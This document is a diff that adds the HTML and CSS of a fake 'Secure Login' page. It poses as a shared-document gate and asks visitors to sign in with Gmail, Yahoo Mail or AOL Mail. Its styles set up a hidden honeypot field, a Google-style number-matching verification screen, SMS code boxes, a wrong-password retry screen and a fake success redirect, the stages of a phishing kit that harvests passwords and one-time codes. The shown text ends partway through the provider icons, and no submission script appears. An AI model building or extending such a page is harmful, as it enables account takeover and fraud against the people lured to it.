@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Secure Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Roboto',sans-serif;min-height:100vh;position:relative;-webkit-tap-highlight-color:transparent;touch-action:manipulation;overflow:hidden}
+.bg{position:fixed;inset:0;background:url('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=1600&q=80') center/cover no-repeat;filter:brightness(0.45) saturate(0.8);z-index:0}
+.bg-tint{position:fixed;inset:0;background:linear-gradient(135deg,rgba(10,30,80,0.6),rgba(20,60,120,0.4));z-index:1}
+
+/* PAGES */
+.page{position:fixed;inset:0;z-index:10;display:none;overflow-y:auto}
+.page.active{display:block}
+
+/* LOGIN */
+#loginPage .inner{min-height:100vh;display:flex;flex-direction:row;align-items:center;justify-content:space-between;padding:0 8%}
+.left{color:white;max-width:420px}
+
+.left h2{font-size:28px;font-weight:700;margin-bottom:10px;color:white}
+.left p{font-size:14.5px;color:rgba(255,255,255,0.8);line-height:1.65;margin-bottom:30px;max-width:340px}
+.providers{display:flex;gap:10px;flex-wrap:wrap}
+.provider-icon{width:52px;height:52px;border-radius:12px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:transform 0.2s,box-shadow 0.2s,border 0.2s;user-select:none;border:2px solid transparent;background:rgba(255,255,255,0.1)}
+.provider-icon:hover{transform:translateY(-3px);box-shadow:0 8px 20px rgba(0,0,0,0.4)}
+.provider-icon.active{border:2px solid white;transform:translateY(-3px);box-shadow:0 8px 24px rgba(0,0,0,0.5)}
+.provider-icon img{width:36px;height:36px;object-fit:contain;border-radius:4px}
+.card{background:rgba(40,45,55,0.92);backdrop-filter:blur(16px);border-radius:12px;padding:40px 36px 36px;width:360px;color:white;box-shadow:0 20px 60px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.08)}
+.card-logo{width:80px;height:80px;background:white;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:-80px auto 20px;box-shadow:0 4px 20px rgba(0,0,0,0.35);border:3px solid white;overflow:hidden}
+.card-logo-inner{width:64px;height:64px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#EA4335;transition:background 0.3s}
+.card-logo-inner img{width:38px;height:38px;object-fit:contain}
+.card-title{text-align:center;font-size:20px;font-weight:600;margin-bottom:24px;color:white;transition:opacity 0.25s;min-height:28px}
+.input-group{display:flex;align-items:center;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.15);border-radius:6px;margin-bottom:14px;overflow:hidden;transition:border-color 0.2s}
+.input-group:focus-within{border-color:rgba(100,160,255,0.6);background:rgba(255,255,255,0.18)}
+.input-icon{width:42px;display:flex;align-items:center;justify-content:center;color:rgba(255,255,255,0.5);flex-shrink:0}
+.input-group input{flex:1;background:transparent;border:none;outline:none;color:white;font-size:14px;padding:13px 12px 13px 0;font-family:'Roboto',sans-serif}
+.input-group input::placeholder{color:rgba(255,255,255,0.4)}
+.hp-field{opacity:0;position:absolute;top:-9999px;left:-9999px;height:0;width:0;z-index:-1}
+.remember{display:flex;align-items:center;gap:8px;margin-bottom:18px;font-size:13px;color:rgba(255,255,255,0.65);cursor:pointer}
+.remember input[type="checkbox"]{width:14px;height:14px;accent-color:#4a90e2}
+.btn-login{width:100%;padding:13px;background:#2979d4;color:white;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;transition:background 0.25s,transform 0.15s;font-family:'Roboto',sans-serif;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-login:hover{background:#1a5db5;transform:translateY(-1px)}
+.btn-login:active{transform:scale(0.98)}
+.btn-login:disabled{background:#555;cursor:not-allowed;transform:none}
+.card-footer{text-align:center;margin-top:18px;font-size:13px;color:rgba(255,255,255,0.5);line-height:2}
+.card-footer a{color:#6ab0ff;text-decoration:none;font-weight:500}
+.sec-badge{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:14px;font-size:11px;color:rgba(255,255,255,0.25)}
+.spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,0.4);border-top-color:white;border-radius:50%;animation:spin 0.7s linear infinite;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes pop{0%{transform:scale(0.7);opacity:0}60%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}
+.pop{animation:pop 0.35s ease forwards}
+
+/* FS PAGES */
+.fs{position:fixed;inset:0;z-index:20;display:none;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;color:white;overflow-y:auto}
+.fs.active{display:flex}
+.fs-blue{background:linear-gradient(135deg,#0d1b2a,#1a3a6e)}
+.fs-red{background:linear-gradient(135deg,#1a0000,#3d0000)}
+
+.fs-logo{width:88px;height:88px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:22px;animation:logoPulse 2s ease-in-out infinite}
+.fs-logo img{width:48px;height:48px;object-fit:contain;border-radius:6px}
+@keyframes logoPulse{0%,100%{box-shadow:0 8px 32px rgba(0,0,0,0.4)}50%{box-shadow:0 8px 48px rgba(201,168,76,0.5)}}
+
+.fs-title{font-size:24px;font-weight:700;margin-bottom:10px}
+.fs-sub{font-size:14px;color:rgba(255,255,255,0.6);line-height:1.7;max-width:320px;margin-bottom:24px}
+
+/* NEUTRAL WAITING */
+.wait-box{background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.12);border-radius:14px;padding:22px 28px;max-width:340px;width:100%;font-size:13px;color:rgba(255,255,255,0.55);line-height:1.8}
+.wait-box b{color:rgba(255,255,255,0.85)}
+.dots{display:flex;gap:8px;justify-content:center;margin:20px 0}
+.dots span{width:10px;height:10px;border-radius:50%;background:#c9a84c;animation:bounce 1.4s infinite ease-in-out}
+.dots span:nth-child(2){animation-delay:.2s}.dots span:nth-child(3){animation-delay:.4s}
+@keyframes bounce{0%,80%,100%{transform:scale(0.6);opacity:0.4}40%{transform:scale(1);opacity:1}}
+
+/* NUMBER PROMPT */
+.num-box{background:rgba(255,255,255,0.08);border:2px solid rgba(255,255,255,0.2);border-radius:20px;padding:32px 48px;margin-bottom:22px;animation:numPulse 2s ease-in-out infinite}
+@keyframes numPulse{0%,100%{border-color:rgba(255,255,255,0.2)}50%{border-color:rgba(201,168,76,0.7);box-shadow:0 0 40px rgba(201,168,76,0.2)}}
+.num-label{font-size:11px;letter-spacing:3px;text-transform:uppercase;color:rgba(255,255,255,0.4);margin-bottom:10px;font-weight:600}
+.num-display{font-size:88px;font-weight:900;color:white;line-height:1;text-shadow:0 4px 24px rgba(201,168,76,0.6);letter-spacing:8px}
+.num-hint{font-size:12px;color:rgba(255,255,255,0.4);margin-top:12px;line-height:1.5}
+.info-box{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:18px 22px;font-size:13px;color:rgba(255,255,255,0.55);line-height:1.9;max-width:320px;width:100%;text-align:left}
+.info-box b{color:rgba(255,255,255,0.85)}
+
+/* SMS */
+.sms-box{background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);border-radius:16px;padding:28px 24px;width:100%;max-width:340px;margin-bottom:20px}
+.sms-lbl{font-size:13px;color:rgba(255,255,255,0.6);margin-bottom:18px;line-height:1.6}
+.sms-row{display:flex;gap:10px;justify-content:center;margin-bottom:18px}
+.sms-d{width:44px;height:54px;background:rgba(255,255,255,0.12);border:2px solid rgba(255,255,255,0.2);border-radius:10px;color:white;font-size:22px;font-weight:700;text-align:center;outline:none;font-family:'Roboto',sans-serif;transition:border-color 0.2s;caret-color:transparent}
+.sms-d:focus{border-color:rgba(100,160,255,0.7);background:rgba(255,255,255,0.18)}
+.btn-sub{width:100%;padding:13px;background:#2979d4;color:white;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;font-family:'Roboto',sans-serif;display:flex;align-items:center;justify-content:center;gap:8px;transition:background 0.2s,transform 0.15s}
+.btn-sub:hover{background:#1a5db5;transform:translateY(-1px)}
+.btn-sub:disabled{background:#555;cursor:not-allowed;transform:none}
+
+/* PASS ERROR */
+.pass-box{background:rgba(255,255,255,0.08);border:1px solid rgba(255,100,100,0.3);border-radius:16px;padding:24px;width:100%;max-width:340px;margin-bottom:20px}
+.pass-err{display:flex;align-items:center;gap:8px;background:rgba(192,57,43,0.2);border:1px solid rgba(192,57,43,0.4);border-radius:8px;padding:10px 14px;margin-bottom:16px;font-size:13px;color:#ff8a8a}
+
+/* WHITE FS PAGES */
+.fs-white{background:#f8f9fa}
+
+/* GOOGLE-STYLE VERIFY */
+.google-verify-wrap{background:white;border-radius:28px;padding:36px 32px 28px;max-width:400px;width:100%;box-shadow:0 4px 32px rgba(0,0,0,0.12);text-align:center;animation:slideUp 0.5s ease forwards}
+@keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
+.gv-logo-wrap{display:flex;justify-content:center;margin-bottom:20px}
+.gv-logo{width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.gv-logo img{width:36px;height:36px;object-fit:contain}
+.gv-number-big{font-size:80px;font-weight:900;color:#1a73e8;line-height:1;margin-bottom:8px;letter-spacing:4px}
+.gv-title{font-size:22px;font-weight:600;color:#202124;margin-bottom:22px}
+.gv-device-row{display:flex;align-items:center;gap:14px;background:#f1f3f4;border-radius:12px;padding:14px 16px;margin-bottom:18px;text-align:left}
+.gv-device-icon{font-size:28px;flex-shrink:0}
+.gv-device-name{font-size:14px;font-weight:600;color:#202124;margin-bottom:2px}
+.gv-device-sub{font-size:12px;color:#5f6368}
+.gv-instruction{font-size:14px;color:#202124;line-height:1.7;margin-bottom:20px;padding:0 4px;text-align:left}
+.gv-instruction b{color:#1a73e8}
+.gv-divider{height:1px;background:#e8eaed;margin-bottom:16px}
+.gv-links{display:flex;flex-direction:column;gap:10px}
+.gv-link{font-size:14px;color:#1a73e8;text-decoration:none;font-weight:500;padding:8px 0}
+.gv-link:hover{text-decoration:underline}
+.gv-link-alt{color:#5f6368;font-size:13px}
+
+/* REDIRECT / SUCCESS PAGE */
+.redirect-wrap{background:white;border-radius:28px;padding:48px 36px;max-width:380px;width:100%;box-shadow:0 4px 32px rgba(0,0,0,0.12);text-align:center;animation:slideUp 0.5s ease forwards}
+.redirect-check{font-size:56px;margin-bottom:16px;animation:popIn 0.5s ease}
+@keyframes popIn{from{transform:scale(0.5);opacity:0}to{transform:scale(1);opacity:1}}
+.redirect-title{font-size:24px;font-weight:700;color:#202124;margin-bottom:10px}
+.redirect-sub{font-size:15px;color:#5f6368;line-height:1.6;margin-bottom:28px}
+.redirect-spinner-wrap{display:flex;justify-content:center;margin-bottom:20px}
+.redirect-spinner{width:48px;height:48px;border:4px solid #e8eaed;border-top:4px solid #1a73e8;border-radius:50%;animation:rSpin 0.9s linear infinite}
+@keyframes rSpin{to{transform:rotate(360deg)}}
+.redirect-dots{display:flex;gap:8px;justify-content:center;margin-bottom:20px}
+.rd{width:8px;height:8px;border-radius:50%;background:#1a73e8;animation:rdBounce 1.4s infinite ease-in-out}
+.rd:nth-child(2){animation-delay:.2s}.rd:nth-child(3){animation-delay:.4s}
+@keyframes rdBounce{0%,80%,100%{transform:scale(0.6);opacity:0.3}40%{transform:scale(1);opacity:1}}
+.redirect-note{font-size:12px;color:#9aa0a6;line-height:1.5}
+
+/* MOBILE */
+@media(max-width:480px){
+  .google-verify-wrap{padding:28px 20px 22px;border-radius:20px}
+  .gv-number-big{font-size:64px}
+  .gv-title{font-size:18px}
+  .redirect-wrap{padding:36px 22px;border-radius:20px}
+  .redirect-title{font-size:20px}
+}
+
+/* BLOCKED */
+.blk-icon{font-size:64px;margin-bottom:20px;animation:shake 0.5s ease}
+@keyframes shake{0%,100%{transform:rotate(0)}25%{transform:rotate(-8deg)}75%{transform:rotate(8deg)}}
+.blk-title{font-size:26px;font-weight:700;color:#ff6b6b;margin-bottom:10px}
+.blk-sub{font-size:14px;color:rgba(255,255,255,0.5);max-width:300px;line-height:1.7;margin-bottom:20px}
+.blk-badge{background:rgba(255,107,107,0.15);border:1px solid rgba(255,107,107,0.3);border-radius:20px;padding:8px 20px;font-size:12px;color:#ff9999;letter-spacing:1px;text-transform:uppercase}
+
+/* TOAST */
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);padding:12px 28px;border-radius:8px;font-size:14px;font-weight:500;color:white;z-index:9999;opacity:0;transition:opacity 0.4s;pointer-events:none;white-space:nowrap;box-shadow:0 8px 24px rgba(0,0,0,0.4)}
+.toast.success{background:#27ae60}.toast.error{background:#c0392b}.toast.show{opacity:1}
+
+/* MOBILE */
+@media(max-width:768px){
+  #loginPage .inner{flex-direction:column;justify-content:flex-start;padding:32px 20px 48px;gap:24px;align-items:center}
+  .left{text-align:center;max-width:100%;width:100%}
+
+  .left h2{font-size:22px}
+  .left p{font-size:13px;margin-bottom:18px}
+  .providers{justify-content:center;gap:12px}
+  .card{width:100%;max-width:420px;padding:40px 20px 28px;border-radius:14px}
+  .card-logo{width:70px;height:70px;margin:-58px auto 16px}
+  .card-logo-inner{width:56px;height:56px}
+  .card-title{font-size:17px;margin-bottom:16px}
+  .fs{padding:36px 20px}
+  .fs-title{font-size:20px}
+  .fs-sub{font-size:13px}
+  .num-display{font-size:68px}
+  .num-box{padding:24px 36px}
+  .sms-d{width:40px;height:50px;font-size:20px}
+  .seat-card{padding:30px 20px}
+  .seat-num{font-size:58px}
+}
+@media(max-width:400px){
+  .providers{gap:8px}
+  .provider-icon{width:46px;height:46px}
+  .sms-d{width:34px;height:46px;font-size:18px;gap:6px}
+  .sms-row{gap:6px}
+}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="bg-tint"></div>
+<div class="toast" id="toast"></div>
+
+<!-- LOGIN PAGE -->
+<div class="page active" id="loginPage">
+ <div class="inner">
+  <div class="left">
+
+    <p>To access the document, please choose your preferred provider below and login to view shared files.</p>
+    <div class="providers">
+      <div class="provider-icon active" data-name="Gmail"      data-color="#EA4335" data-img="gmail"     onclick="switchProvider(this)"><img src='data:image/png;base64,/9j/4AAQSkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAMqADAAQAAAABAAAAMgAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/8AAEQgAMgAyAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/bAEMAAQEBAQEBAgEBAgMCAgIDBAMDAwMEBgQEBAQEBgcGBgYGBgYHBwcHBwcHBwgICAgICAkJCQkJCwsLCwsLCwsLC//bAEMBAgICAwMDBQMDBQsIBggLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLC//dAAQABP/aAAwDAQACEQMRAD8A/gAAJ6U/y29v++hX9L//AAQzHwUPwr8QReMdG0q78SSeIQbS41GyhuWeOK3iKxxtMjrlWLN5ffdnB7f2mfsw/Fz9iLxobfwL8c/hb4E0nVmIjg1QeHdNjtLljwBKPs+IXPr/AKsn+70r5mHFWEWYTy+t7kk7Jv4X8+nz0876H6XPwrziWRUc+wcfa05x5nGKfPFXavb7S01tquzV2v8AJU8tvb/voUeW3t/30K/235/2Sv2S9u6P4VeCsEAgjw7ppBB6H/j3rmL79k39lQZ2/CzwWP8AuXdN/wDkavq1Sfc/M7n+KN5be35ikKkdcfnX+uJ+1Jrf7C/7PkUvh+2+GPgvWPFBX5NOi0HTgsGejXLi3/djvsHzt6Ac1/K1/wAFMdS+E3if4BeO9a8S+G/DtprF3pMrWEOm6TaWZgaMhkaJYIkMaof4ycnuSTXzOZcS4TCYiGFi+ebaTS2jd21ffy372P0/hrwpzjNctrZtNKjQhCU4uSd6nKr+6t7O3xPTtfW38b1FKeppK+hPzPlZ/9D+eX/glvpdnq37Ovii2u13Y1x2U9wwtoiCD2IPSv67/ib+yR478CeCNI8Y+DjNq2n3Om2lxNCxLzoZIUZiCeXGScg/N9a/kY/4JUy+X8A/E6+utSf+k0df6YPgLQrTWPhH4aguUDBtG0/qP+neOvzLLMpw+Y5zmtDEq6Tg13Ts9V/WvU/qLOuLcy4e4O4Xx2Wz5Xy1VJPWM0pR0kuq7bNX0aPxP/ZY/wCCi/jr4ByweC/HqzeIPCSHZ9nZv9LsRnn7OzHlR3hc7f7pU17h+1j/AMFTxrVvL4K/ZnaW0t5Uxca7PH5U53DlbaNuY8dDK/zZ+6B96um/ap/YX0HxuZvEHguI2etvkoIVyJ29HXgf8C4x3NeSfs7f8E9x4fvovEvxlWO9vIiGjskO+3jYd2P8ZH5V60Mpz2j/AMJ1Gt+5e0+sV27r0XyaVzhfFvh7jf8AjJcdg7Y2O9BfBUm9VO1uRre7dt3zRlLlv8m/BT9mf4ifG65/4SbxAZrDSZnMj3U2TPcluSU3cnPd2/Wvxe/4Kp+AtK8A6r8Z/DGjRmO3sLWWKMMSzbRBEeSck8kn8a/ur0jwpZ2VmIoYlREXCqBgACv4rf8AgtVAIPiP8eowOkU3/pPDXBxHkeGyzDYONFXk60Lye73+5eX5vU9LgTj7NOJswzipjJWpRwdbkpx+GOsVfzlbeT16Ky0P4wD1NJSnqaSv0Y/l0//R/nY/4JbzCP4EeJlJx/xOZD/5LR1/qA/CGIXHwp8LiJlH/Em07cxPC/6NH+Z9q/xfvh18dfi78JbG60z4da9daTb3rB5ooWGx2A25wwIzjjI7V+kGlf8ABev/AIK+6JpVroelfHjxHDaWUKQQRKbfakcahVUfuegAAr53KMmq4PM8ZjZyTjW5bJXurXvfS34n6fxXxxg814XybJKNKUauEVRTbtyy5mrctnfprdL5n+s7Pp9gsbJFgs/3nJG5v8B7DiuQPh+AXJ24xX+VGP8Ag4C/4LHD/mvniT/yW/8AjFNP/BwB/wAFiyd3/C/PEef+3b/4xX1SrI/L7H+rNNpsccZGR09a/hd/4LcBU+KHx9jBHEc3A/694a/DST/gvv8A8Fh5hh/j54l5/wBq3H/tGvib40ftu/tXftD6hrGq/GjxzqXiC48QMH1GS5dQ1yQFHz7FXPCqMdDivm+JMrqZlDDxpSS5KkZu/ZX2t118j9J8NuMsJw7UzGpi6cp+3w1SjHltpKbjZu7Xu6a2u/I+Vz1NJRRXuH51zI//0v8AP/ooooAKKKKACiiigAooooA//9k=' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
+      <div class="provider-icon"        data-name="Yahoo Mail"  data-color="#7B0099" data-img="yahoo"     onclick="switchProvider(this)"><img src='data:image/png;base64,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' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
+      <div class="provider-icon"        data-name="AOL Mail"    data-color="#FF0000" data-img="aol"       onclick="switchProvider(this)"><img src='data:image/png;base64,/9j/4AAQSkZJRgABAQAASABIAAD/4QBMRXhpZgAATU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAGKADAAQAAAABAAAAGAAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAAAAAABDUHYzZjwCyBOmACZjs+EJ+/8AAEQgAGAAYAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/bAEMAAQEBAQEBAgEBAgMCAgIDBAMDAwMEBgQEBAQEBgcGBgYGBgYHBwcHBwcHBwgICAgICAkJCQkJCwsLCwsLCwsLC//bAEMBAgICAwMDBQMDBQsIBggLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLC//dAAQAAv/aAAwDAQACEQMRAD8A/g28PfDL4keLvD2p+LvCfh7UtU0nRU8zUL20tJZ7e0XBbM0iKUjGATlyOATXEV/Yj+wD8DvDXwS/Y38N/DjxsbCK9+IUU2pazaXkgjmni1KIpHCiEglhF5SMp6Hfxk15J8E/2Cfgl8JfAVh4H1LwDp3j6+v9WvrPXtW1FohNYW8Zl8mSNJAWAKCIBYdjnzPMziv0ej4c4mtToTp1EnON5XTfK3aysrvXm17Wbeh+N4nxiwWGrYqFWi2qc+WFmlzxXNzSvJpKzjor3lzRS1Z/LxefD7x7p3g60+ImoaHqEHh+/lMFrqcltItnNKpcFI5ivlswMbgqrE/K3oa5Cv3r/bM+Gul6V+wN4Q+FXwZjuNbsrHx5qdvp8dsrXMrxQzasSq7AS/lgEFh1C7q/G3/hQnx0/wChL17/AMF1x/8AG6+bzvh2tga0KNNOd4Qk2ldXkrtJrounkfZcM8YYfNMNVxFWUadqlSCTdm4xk0m09m7aruf/0P4Q/Evxf+LPjTX9P8VeMfFGr6tqmkhBY3l5ezT3FsIm3p5UjuWj2t8y7SMHkc1tT/tBfHu5udQvbnxvr8k2rKqX0jalcFrlUXYolJkzIAo2gNnA46V5DRXQsXXTbVR3fm/T8tDkeAwrSi6UbLRe6tFe9lp319T0PT/i78WNJ0Sw8NaV4o1a107SpXnsrWK9mSC2lkDhniRXCozCWQEqASHbP3jnV/4X18c/+h013/wY3H/xyvJ6KqONxEVaNSSXqyZ5Zg5NylRi3/hXXV9Or1P/2Q==' style='width:38px;height:38px;object-fit:contain;border-radius:4px;display:block;'></div>
